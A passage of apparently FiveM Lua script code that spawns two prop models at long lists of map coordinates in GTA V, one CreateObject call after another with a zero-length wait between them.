        CreateObject(841438406, -802.20819091797, -253.92761230469, 36.788028717041, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -808.58575439453, -242.59887695312, 37.036464691162, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -820.70690917969, -214.9810333252, 37.704189300537, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -830.81787109375, -191.96983337402, 37.444049835205, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -844.55413818359, -175.86039733887, 37.463500976562, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -858.94464111328, -159.00291442871, 37.669784545898, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -876.65307617188, -170.47099304199, 38.014739990234, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -901.49310302734, -183.6675567627, 37.530975341797, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -921.02185058594, -194.07048034668, 37.495845794678, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -944.10266113281, -195.88412475586, 37.495014190674, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -968.55554199219, -200.96894836426, 37.222003936768, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -988.82012939453, -220.45167541504, 37.907089233398, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1024.4562988281, -241.43873596191, 37.525581359863, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1085.2475585938, -274.20718383789, 37.617164611816, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1103.4658203125, -269.15484619141, 37.867721557617, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1126.8005371094, -281.48663330078, 38.657535552979, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1148.359375, -292.28182983398, 38.791648864746, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1170.48828125, -291.85784912109, 38.992107391357, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1193.6276855469, -291.40768432617, 38.889110565186, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1218.7214355469, -290.92233276367, 37.657947540283, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1233.4307861328, -303.12777709961, 37.736988067627, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1248.2092285156, -315.27133178711, 37.84058380127, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1267.5900878906, -331.3115234375, 36.98416519165, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1283.8361816406, -344.75610351562, 36.470161437988, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1305.3353271484, -356.01519775391, 36.613246917725, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1334.1020507812, -360.79891967773, 36.65678024292, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1350.9398193359, -363.59573364258, 36.494960784912, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1367.2520751953, -379.93838500977, 36.652248382568, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1380.2022705078, -394.00366210938, 36.445823669434, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1402.9261474609, -398.17565917969, 36.796722412109, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1423.9675292969, -410.1028137207, 36.635139465332, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1441.4888916016, -420.03536987305, 36.128063201904, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1453.7445068359, -426.98056030273, 35.317489624023, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1475.6639404297, -439.37313842773, 35.271514892578, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1489.6983642578, -447.29193115234, 35.367473602295, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1501.1840820312, -453.77963256836, 35.336555480957, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1519.5579833984, -464.14825439453, 35.0448608398, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1533.578125, -472.01034545898, 35.126083374023, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1548.4698486328, -480.34732055664, 35.123199462891, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1560.7679443359, -487.18835449219, 35.087757110596, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1563.197265625, -499.99365234375, 35.675567626953, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1581.5412597656, -515.58569335938, 35.297256469727, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1605.193359375, -520.12579345703, 34.724109649658, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1688.1834716797, -528.16271972656, 40.576705932617, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1721.0336914062, -510.43545532227, 40.12907409668, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1741.0587158203, -501.48364257812, 38.634918212891, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1756.7415771484, -481.97271728516, 40.477088928223, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1769.8996582031, -465.51202392578, 41.534847259521, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1782.4383544922, -449.83868408203, 41.548976898193, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1804.0675048828, -439.05447387695, 42.195014953613, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1819.3243408203, -431.49542236328, 42.949752807617, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1831.8289794922, -425.26312255859, 43.874549865723, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1853.2891845703, -414.64498901367, 45.302425384521, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1868.5047607422, -407.18606567383, 46.350208282471, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1885.1983642578, -384.8176574707, 48.292461395264, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1890.3519287109, -366.56503295898, 48.854564666748, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1884.8326416016, -352.58810424805, 49.027431488037, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1876.5070800781, -331.61865234375, 47.802089691162, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1846.9636230469, -276.33001708984, 46.736312866211, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1819.0274658203, -325.36376953125, 45.809062957764, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1815.0964355469, -339.87322998047, 45.582927703857, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1808.5787353516, -364.11291503906, 44.005798339844, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1802.4747314453, -385.29006958008, 42.198215484619, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1790.9311523438, -428.03890991211, 38.48904800415, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1788.2253417969, -444.82955932617, 36.995174407959, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1784.5886230469, -467.58825683594, 34.884159088135, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1779.6987304688, -498.20559692383, 32.018699645996, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1774.1787109375, -532.76300048828, 28.706546783447, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1769.2905273438, -563.36108398438, 25.689037322998, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1766.2933349609, -582.12066650391, 23.8088016501, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1768.0249023438, -628.46899414062, 10.519196510315, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1759.4582519531, -646.53729248047, 10.309303283691, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1751.3765869141, -663.78558349609, 10.14768409729, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1740.7327880859, -686.55798339844, 10.167251586914, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1713.8133544922, -719.93347167969, 10.937111854553, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1696.1872558594, -733.31097412109, 11.090492248535, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1676.1856689453, -748.51867675781, 9.9981365203857, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1665.0916748047, -758.46258544922, 12.244045257568, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1647.5239257812, -776.37884521484, 13.427575111389, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1651.6759033203, -799.07305908203, 12.3508644104, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1656.9287109375, -823.55224609375, 10.77232170105, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1662.8148193359, -850.9658203125, 8.9593496322632, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1666.8171386719, -869.54602050781, 8.6330251693726, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1671.4582519531, -891.08728027344, 8.290337562561, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1676.3131103516, -913.60424804688, 7.8747358322144, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1679.9108886719, -930.2587890625, 7.4615921974182, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1684.5755615234, -951.86242675781, 7.5586032867432, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1689.5715332031, -975.40484619141, 6.8873271942139, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1693.1550292969, -992.03637695312, 6.3932785987854, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1657.939453125, -1028.4793701172, 12.766311645508, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1674.8597412109, -1044.0367431641, 12.859534263611, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1688.9105224609, -1056.8914794922, 12.827094078064, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1706.6948242188, -1073.1491699219, 12.829881668091, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1842.8005371094, -1232.2490234375, 12.765271186829, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1859.7833251953, -1221.6228027344, 13.040806770325, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1879.8327636719, -1201.8630371094, 13.140325546265, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1818.8970947266, -1244.9155273438, 16.184650421143, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1667.5478515625, -1112.1121826172, 15.34307384491, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1488.2962646484, -956.50500488281, 8.6661567687988, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1481.39453125, -965.09893798828, 9.0651473999023, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1442.4974365234, -02.0303344727, 8.0529880523682, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1426.8947753906, -1020.1224975586, 4.8073205947876, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1409.9012451172, -1039.7980957031, 4.3698844909668, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1390.2004394531, -1062.5466308594, 3.8684072494507, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1375.0466308594, -1080.0139160156, 3.980809211731, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1366.4007568359, -1114.6849365234, 8.4048643112183, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1364.3050537109, -1128.5925292969, 8.2246036529541, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1360.8507080078, -1151.4663085938, 7.1339063644409, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1358.1575927734, -1169.2646484375, 5.4720897674561, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1357.9407958984, -1197.0061035156, 4.2607550621033, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1361.3116455078, -1217.8570556641, 4.3437147140503, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1355.15234375, -1240.2905273438, 4.6479821205139, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1345.3043212891, -1262.2491455078, 6.5375714302063, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1335.3063964844, -1284.5822753906, 7.0228791236877, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1330.1655273438, -1297.8234863281, 6.3680057525635, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1324.9270019531, -1331.2257080078, 5.0359969139099, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1317.7286376953, -1348.9234619141, 5.4501256942749, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1308.4112548828, -1374.6842041016, 4.6584057807922, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1301.1278076172, -1396.6988525391, 4.1395206451416, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1294.0227050781, -1418.3414306641, 4.158908367157, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1276.6690673828, -1437.6485595703, 4.460620880127, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1262.9663085938, -1456.3391113281, 4.6627221107483, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1250.4888916016, -1473.3486328125, 4.041736125946, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1240.3615722656, -1487.1064453125, 4.0352692604065, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1218.2188720703, -1517.1315917969, 4.1369280815125, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1212.6579589844, -1549.1138916016, 4.4212770462036, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1202.3359375, -1566.4606933594, 4.8673343658447, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1039.8928222656, -1397.20830078, 5.301194190979, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -205.97943115234, -1307.7111816406, 32.463283538818, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -208.08169555664, -1322.1918945312, 30.6383934021, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -210.46829223633, -1332.6993408203, 30.6383934021, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 87.46117401123, -1925.2875976562, 22.540056228638, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 101.1555557251, -1933.6849365234, 23.343391418457, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 114.682762146, -1942.3416748047, 22.059331893921, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 91.787879943848, -1947.1599121094, 22.13903427124, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -96.82292175293, -1583.6147460938, 31.914810180664, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -165.88885498047, -1669.705078125, 32.914325714111, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -131.21087646484, -1583.7025146484, 33.982086181641, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -564.41174316406, 272.36557006836, 84.375846862793, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 376.63070678711, 322.68417358398, 103.56887054443, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 435.130305859, 216.90020751953, 102.91343688965, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 462.97250366211, 242.70608520508, 105.35186767578, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 463.30364990234, 252.55215454102, 107.32363891602, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 437.65286254883, 266.67935180664, 103.01537322998, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 429.43933105469, 250.82200622559, 105.63001251221, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 961.47344970703, -137.86401367188, 74.19605255127, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 980.24877929688, -127.23160552979, 73.605422973633, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 968.25885009766, -118.1788482666, 74.214859008789, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 988.52282714844, -112.56884002686, 74.228507995605, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 988.68646240234, -101.54683685303, 74.598121643066, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 980.42834472656, -105.61399841309, 74.69669342041, true, true, true)
        Citizen.Wait(0)
        CreateObject(2967811882, 289.80303955078, 176.33485412598, 104.16362762451, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 342.82180786133, 109.17627716064, 102.25390625, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 311.09707641602, -0.66867196559906, 80.478523254395, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 258.19369506836, -148.08422851562, 63.999645233154, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 190.13160705566, -307.9919128418, 44.129356384277, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 152.85752868652, -413.20791625977, 41.093223571777, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 110.89814758301, -559.67547607422, 31.626415252686, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 44.002738952637, -739.80334472656, 31.767831802368, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -36.021713256836, -931.66741943359, 29.320764541626, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -94.51407623291, -1157.5056152344, 25.760782241821, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -96.965911865234, -1342.0460205078, 29.339040756226, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -133.09577941895, -1528.0103759766, 34.214588165283, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -135.51835632324, -1735.9741210938, 30.103620529175, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 93.584823608398, -1915.9150390625, 20.741292953491, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 154.10935974121, -1792.9288330078, 28.996482849121, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 238.47276306152, -1713.8931884766, 29.075937271118, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 207.06182861328, -1607.7380371094, 29.330911636353, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 232.4162902832, -1420.3079833984, 29.242002487183, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 222.65469360352, -1297.1281738281, 29.314462661743, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 219.94142150879, -1047.5908203125, 29.360450744629, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 305.37609863281, -800.81658935547, 29.339599609375, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 415.33599853516, -523.46160888672, 9.137152671814, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 513.70617675781, -266.5309753418, 47.488845825195, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 513.70617675781, -266.5309753418, 47.488845825195, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 601.40679931641, 37.490180969238, 90.777885437012, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 648.3603515625, 217.51800537109, 97.319801330566, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 667.48309326172, 325.80426025391, 116.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 823.17126464844, 203.20741271973, 81.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 872.45971679688, 139.58018493652, 72.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 785.41644287109, 26.121658325195, 62.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 683.43371582031, -143.50646972656, 46.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 605.70526123047, -289.50973510742, 41.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 516.56384277344, -379.41500854492, 36.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 439.98226928711, -454.90103149414, 38.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 312.71276855469, -485.09936523438, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 189.06901550293, -607.71380615234, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 80.306671142578, -616.57965087891, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 55.985382080078, -686.974609375, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 32.928806304932, -736.70056152344, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -4.1130304336548, -763.57354736328, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -37.031120300293, -755.37908935547, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -77.169891357422, -743.74078369141, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -105.80905151367, -722.05706787109, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -142.09321594238, -699.48010253906, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -179.060463867, -676.13171386719, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -219.05352783203, -668.16857910156, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -244.68600463867, -654.99914550781, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -242.65994262695, -615.35284423828, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -226.61053466797, -576.61193847656, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -204.27388000488, -525.74761962891, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -194.17991638184, -488.07662963867, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -191.74856567383, -441.53875732422, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -163.73318481445, -407.77178955078, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -150.57876586914, -363.31097412109, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -117.31154632568, -300.70907592773, 42.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -112.46209716797, -270.09036254883, 42.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -105.26519012451, -231.9108581543, 47.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -96.305992126465, -208.57139587402, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -82.840637207031, -169.92846679688, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -78.284744262695, -145.34693908691, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -61.337020874023, -53.904315948486, 63.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -3.1353807449341, 119.09279632568, 83.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 29.801212310791, 212.17195129395, 110.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 50.15075302124, 240.48179626465, 110.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 132.52355957031, 209.7177734375, 104.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 267.68319702148, 177.27178955078, 104.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 399.44277954102, 256.72280883789, 104.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 262.4895324707, 433.08334350586, 121.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 153.71487426758, 470.01754760742, 145.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -202.96701049805, 510.14642333984, 133.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -356.908203125, 521.6982421875, 125.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -419.99758911133, 548.14184570312, 123.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -626.81494140625, 690.35791015625, 151.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -886.74847412109, 861.11743164062, 200.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -740.39318847656, 617.63140869141, 141.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -708.70819091797, 572.42120361328, 148.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 27.549457550049, 247.41278076172, 110.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 184.12426757812, 190.31451416016, 106.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 347.67337036133, 132.57824707031, 105.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 496.16052246094, 76.790908813477, 95.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 665.72528076172, 19.524644851685, 82.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 840.81793212891, -88.717002868652, 83.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 975.80151367188, -173.63159179688, 74.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 1101.4017333984, -237.70246887207, 68.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 1199.4383544922, -307.15908813477, 71.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 1213.1346435547, -378.9147644043, 71.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 1267.9310302734, -545.39172363281, 71.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 1367.3148193359, -580.54962158203, 75.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 1346.5030517578, -640.51617431641, 75.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 1292.5853271484, -724.26849365234, 66.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 1244.8343505859, -751.23809814453, 61.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 1201.3557128906, -755.33068847656, 61.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 1170.6009521484, -838.49493408203, 54.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 1165.1292724609, -950.17291259766, 47.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 1177.6690673828, -1049.4836425781, 41.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 1198.9270019531, -1102.0579833984, 41.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 1239.6254882812, -1197.4761962891, 35.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 1243.2370605469, -1258.1798095703, 35.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 1227.9265136719, -1343.5604248047, 35.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 1233.1948242188, -1396.0324707031, 35.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 1260.0971679688, -1450.5186767578, 35.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 1279.4130859375, -1515.7213134766, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 1344.0708007812, -1611.6140136719, 55.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 1391.5943603516, -1700.3395996094, 65.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 1406.8663330078, -1762.0474853516, 65.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 1427.9632568359, -1876.1088867188, 73.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 1356.7377929688, -1986.7507324219, 59.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 1246.3970947266, -2045.0302734375, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 1105.5281982422, -2072.205078125, 38.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 1031.8028564453, -2077.447265625, 32.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 891.376953125, -2072.0400390625, 32.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 755.24206542969, -2052.04296875, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 655.8369140625, -2045.7436523438, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 559.25738525391, -2039.2030029297, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 440.89465332031, -2107.9562988281, 22.435195922852, true, true, true)
            Citizen.Wait(0)
